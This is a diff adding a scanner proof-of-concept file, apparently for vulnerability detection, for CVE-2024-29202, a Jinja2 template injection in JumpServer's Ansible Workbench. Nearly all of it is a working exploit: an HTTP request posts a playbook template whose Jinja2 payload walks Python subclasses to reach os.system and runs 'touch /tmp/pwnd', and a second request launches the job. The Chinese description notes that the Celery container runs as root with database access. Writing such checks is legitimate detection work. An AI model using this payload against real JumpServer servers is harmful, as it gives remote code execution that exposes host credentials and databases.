@@ -1,0 +1,48 @@
+[info]
+author = "ave"
+description = "Jinja2模板注入漏洞导致远程代码执行。攻击者需通过Workbench界面创建一个恶意的playbook模板，利用部署在Celery容器中的Jinja2模板引擎在容器内执行代码。受影响的组件为JumpServer的Ansible模块。攻击者需拥有低权限账户但至少需要访问权限。由于Celery容器运行在root权限下，且可以访问数据库，因此攻击者可以窃取所有主机敏感信息或操纵数据库。该漏洞影响JumpServer v3.0.0到v3.10.6版本，CVSS评分9.9，危害等级严重。官方已在v3.10.7版本修复。"
+id = "POC-AVE-2024-0017"
+name = "CVE-2024-29202 Jinja2模板注入漏洞 PoC"
+severity = "critical"
+tags = ["ave-2024-0017"]
+vuln_id = [
+    "CVE-2024-29202",
+    "AVE-2024-0017",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/workbench/playbooks/templates"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"name": "CVE-2024-29202", "content": "- name: |\n       {% for x in ().__class__.__base__.__subclasses__() %}\n         {% if \"warning\" in x.__name__ %}\n           {{\n             x()._module.__builtins__[\"__import__\"](\"os\").system(\"touch /tmp/pwnd\")\n           }}\n         {%endif%}\n       {%endfor%}"}'
+type = "json"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [201]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/workbench/playbooks/jobs"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"name": "CVE-2024-29202", "playbook_template_id": "CVE-2024-29202"}'
+type = "json"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [201]
+type = "status"
